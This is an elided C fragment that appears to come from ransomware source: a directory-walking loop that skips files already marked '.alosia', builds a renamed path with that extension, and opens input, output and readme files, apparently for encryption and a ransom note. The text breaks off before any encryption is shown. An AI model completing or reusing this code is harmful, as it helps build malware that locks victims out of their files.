		...
		while((ent=readdir(dir)) !=NULL)
		{
			...
			if(strcmp(last_four,".alosia") != 0)
			{
				if(ent->d_type == 8)
				{
					...
					char* new_name = (char*) malloc(strlen(full_path)+strlen(".alosia")+1);
					strcpy(new_name,full_path);
					strcat(new_name,".alosia");
					if(strcmp(full_path,"/home/aku") !=0 && strcmp(full_path,"/home/aku")!=0 && strcmp(full_path,"/home/aku") !=0)
					{
						FILE* fpin;
						FILE* fpout;
						FILE* fpreadme;
